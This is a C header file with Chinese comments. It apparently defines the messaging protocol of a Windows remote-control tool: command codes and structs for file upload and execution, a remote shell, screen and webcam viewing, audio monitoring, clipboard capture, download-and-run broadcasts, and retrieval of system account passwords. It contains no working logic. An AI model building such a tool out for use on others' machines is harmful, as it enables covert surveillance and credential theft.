#pragma once
#include <windows.h>

//数据传输的缓冲区大小
#define CONTEXT_BUF_SIZE   (1024 * 4)
//IP地址缓冲区大小
#define IPADDR_SIZE  32
//从网页获取IP地址的信息缓冲区
#define WEBSITE_BUF_SIZE  512
//屏幕传输的缓冲区大小
#define SCREEN_BUF_SIZE  4030
//视屏传输缓冲区大小
#define VIDEO_BUF_SIZE   4020
//语音传输缓冲区大小
#define AUDIO_BUF_SIZE   4078
//剪贴板传输缓冲区大小
#define CLIPBOARD_BUF_SIZE   4078

//---------------------------------------------------
//指令的宏定义

#define CMD_SHAKEHAND      0x01  //握手验证
#define CMD_SYSINFO        0x02  //系统信息
#define CMD_DISKINFO       0x03  //磁盘信息
#define CMD_FILELIST       0x04  //文件夹信息
#define CMD_DOWNLOAD       0x05  //文件下载
#define CMD_UPLOAD         0x06  //文件上传
#define CMD_FILEUPLOAD     0x07  //文件数据上传
#define CMD_FILEEXEC       0x08  //文件执行
#define CMD_REFRESH        0x09  //刷新
#define CMD_FOLDER_CREATE  0x10  //创建目录(文件夹)
#define CMD_FILE_DEL       0x11  //文件（夹）删除
#define CMD_FILE_COPY      0x12  //文件的复制
#define CMD_FILE_PASTE     0x13  //文件的粘贴
#define CMD_FILE_RENAME    0x14  //文件(夹)重命名
#define CMD_ATTRIBUTE      0x15  //属性
#define CMD_TELNET         0x16  //开启远程终端
#define CMD_COMMOND        0x17  //发送命令
#define CMD_CHATMSG        0x18  //聊天消息
#define CMD_PROGRESS       0x19  //进程管理
#define CMD_PROC_TASKKILL  0x20  //关闭进程
#define CMD_SCREEN         0x21  //屏幕查看
#define CMD_GETPWD         0x22  //获取系统的帐号密码
#define CMD_VIDEO_VIEW     0x23  //视屏查看
#define CMD_OPERATOR       0x24  //关机/注销/重启
#define CMD_AUDIO          0x25  //语音监听
#define CMD_BROADCAST      0x26  //远程命令广播
#define CMD_DESKTOP        0x27  //桌面管理
//-----------------------------------------------------

typedef struct tagMSGINFO //传输消息结构体
{
	int Msg_id;
	BYTE context[CONTEXT_BUF_SIZE];
}MSGINFO_S;

typedef struct tagSYSTEMINFO  //操作系统信息
{
	char szWANIP[IPADDR_SIZE];    //公网IP地址
	char szLocalIP[IPADDR_SIZE];  //本机IP地址
	char hostName[255];   //计算机名
	bool Cam; //摄像头
	int OSVer;  //操作系统版本
	wchar_t szCPUInfo[MAX_PATH]; //cpu信息
	DWORD dwDiskSize;  //硬盘信息
}SYSTEMINFO_S;

typedef struct tagDRIVER  //磁盘信息
{
	wchar_t disk;    //磁盘名
	double dwTotal;   //磁盘的大小
	double dwFree;    //剩余空间
	int nType;  //类型
}DRIVER_S;

typedef struct tagFILEINFO      //文件信息
{
	TCHAR szFileName[MAX_PATH]; //文件名
	int nType;                  //文件类型(文件\文件夹)
	__int64 size;               //文件大小
}FILEINFO_S;

typedef struct tagTEMPSTRUCT  //在文件下载过程中的临时结构体
{
	DWORD cFileInfo;      //CFileInfo类的指针
	SOCKET l_Socket;      //socket对象
	BYTE context[MAX_PATH]; //文件路径
}TEMPSTRUCT;

typedef struct tagDOWNFILEDATA   //文件传输数据块结构
{
	BYTE context[512];  //块数据的大小
	UINT size;          //文件大小
	UINT nCount;        //次数，用于进度条的显示
	bool bFlag;         //文件是否传输完毕
}DOWNFILEDATA_S;

typedef struct tagFILEEXECINFO  //文件执行结果信息
{
	wchar_t szFilePath[MAX_PATH];  //文件名
	bool bSuccess;              //执行结果
}FILEEXECINFO_S;

typedef struct tagFILEDELSTRUCT  //文件（夹）删除传递线程的结构体
{
	DWORD cDiskInfo;          //CDisk类的指针
	SOCKET l_Socket;          //socket对象
	FILEINFO_S tagFileInfo;  //文件类型结构体
}FILEDELSTRUCT_S;

typedef struct tagFILECOPY    //文件复制结果信息
{
	wchar_t szFilePath[MAX_PATH];  //文件全路径
	wchar_t szFileName[MAX_PATH];  //文件名
	bool bTag;                   //是否发送完毕
}FILECOPY_S;

typedef struct tagATTRIBUTE   //属性
{
	wchar_t szFilePath[MAX_PATH];  //文件所在的目录
	wchar_t szFileName[MAX_PATH];  //文件名
	int nType;                     //文件(夹)类型
	SYSTEMTIME sysCreateTime;      //创建时间
	SYSTEMTIME sysModifyTime;      //修改时间
	SYSTEMTIME sysVisitTime;       //访问时间
	bool bArchive;                 //存档
	bool bReadOnly;                //只读
	bool bHide;                    //隐藏
	bool bSystem;                  //系统
}ATTRIBUTE_S;

typedef struct tagCMD       //CMD命令信息
{
	int flag;            //结构体保留字段
	char command[1024];  //命令行
}COMMOND_S;

typedef struct tagCHATMSG   //聊天消息
{
	bool bfirstSend;   //是否第一次发送信息
	bool bClose;  //是否关闭
	wchar_t szChatMsg[1024];  //聊天内容
}CHATMSG_S;

typedef struct tagPROGRESS  //进程列表信息
{
	wchar_t szProName[MAX_PATH];   //进程名
	DWORD nPid;            //进程ID号
	int nThreadCount;    //线程总数
    int nLevel;          //进程级别
	wchar_t szProPath[MAX_PATH];  //进程路径
	int nTag;     //结束掉进程是不是成功了(保留关键字)
}PROGRESS_S;

typedef struct tagBMPHEADINFO  //BMP位图头信息
{
	BITMAPINFO tagBitmapInfo;   //位图信息
}BMPHEADINFO_S;

typedef struct tagBMPDATA  //BMP图像数据
{
	BITMAPINFO bmpinfo;  //位图信息
	int Id;
	bool bShow;  //是否可以显示图像
	int Size;
	int HeadSize;
	UINT Begin;      
	BYTE Data[SCREEN_BUF_SIZE];   //上面的结构体大小是64 + 4030 = 4094 < 4 * 1024
}BMPDATA_S;

typedef struct tagREADPSWDATA  //重要的系统帐号和密码
{
	wchar_t szUserName[250];  //帐号
	wchar_t szUserPwd[250];   //密码
	wchar_t szDomain[250];    //域
	wchar_t szErrorMsg[50];   //错误信息
}READPSWDATA_S;

typedef struct tagVIDEODATA  //视屏数据
{
	BITMAPINFO bmpinfo;  //位图信息
	int Id;
	bool bShow;         //是否可以显示图像
	DWORD Size;         //数据大小 
	int HeadSize;       //视屏头数据
	UINT Begin;         //第几次发送
	int dwExtend1;     //压缩前长度
	int dwExtend2;     //压缩后长度
	BYTE Data[VIDEO_BUF_SIZE];   //上面的结构体大小是74 + 4020 = 4094 < 4 * 1024
}VIDEODATA_S;

typedef struct tagVIDEOTEMP
{
	DWORD cThis;
	SOCKET l_Socket;
}VIDEOTEMP_S;

typedef struct tagOPERATOR  //关机/注销/重启
{
	int nType;  //类型（0--表示关机， 1--表示注销， 2--表示重启）
}OPERATOR_S;

typedef struct tagAUDIODATA  //语音数据
{
	int Id;
	bool bRead;  //是否接受完数据
	DWORD dwSize;  //数据大小
	UINT Begin;    //第几次发送
    BYTE Data[AUDIO_BUF_SIZE];  //数据
}AUDIODATA_S;

typedef struct tagINTERNET  //网页
{
	bool bDownLoad;   //是否下载文件
	bool bRunExe;   //是否运行下载文件
	wchar_t szWebSite[MAX_PATH];  //网页的路径
}INTERNET_S;

typedef struct tagWNDINFO  //弹窗信息
{
	wchar_t szTitle[MAX_PATH];  //标题
	wchar_t szContent[MAX_PATH];  //内容
	UINT nType;    //类型
}WNDINFO_S;

typedef struct tagBROADCAST  //广播命令
{
	bool bTag;  //标志
	INTERNET_S tagInternet;
	WNDINFO_S tagWndInfo;
}BROADCAST_S;

typedef struct tagBROADTEMP  //临时结构体
{
	DWORD cWorkMain;
	BROADCAST_S* pTagBroadCast;
}BROADTEMP_S;

typedef struct tagDESKTOPINFO  //桌面管理
{
	int nType;  //操作类型
	bool bTag;  //操作标记
}DESKTOPINFO_S;

typedef struct tagCLIPBOARD
{
	int id;
	bool bRead;  //是否接受完数据
	DWORD dwSize;  //数据大小
	UINT Begin;    //第几次发送
	char Data[CLIPBOARD_BUF_SIZE];  //数据
}CLIPBOARD_S;
//------------------------------------------

//操作系统的版本号
enum SYSVERSION
{
	OS_2000,
	OS_XP,
	OS_2003,
	OS_Vista,   //Vista版本号与2008 server一样
	OS_WIN7,
	OS_WIN8,
	OS_UNKNOWN  //未知操作系统
};

//硬盘类型
enum DISKTYPE
{
	DISK_FIXED,        //固定硬盘
	DISK_REMOVABLE,    //移动硬盘
	DISK_CDROM         //CD-ROM
};

//文件类型
enum FILEATTR
{
	FILE_ATTR,    //文件
	FOLDER_ATTR,   //文件夹
	FILE_TAG       //标志位，表示文件信息已经发送完毕
};

//进程优先级
enum PROGRESS_LEVEL  
{
	UNKNOWN_LEVEL,    //未知
	NORMAL,           //标准
	IDLE,             //低
	REALTIME,         //实时
	HIGH,             //高
	ABOVENORMAL,      //高于标准
	BELOWNORMAL       //低于标准
};

//桌面管理类型
enum DESKTOP_TYPE
{
	MOUSE_MOVE,   //鼠标移动
	DESKTOP_ICON,  //桌面图标
	TASKBAR,      //任务管理
	CLIPBOARD    //剪贴板
};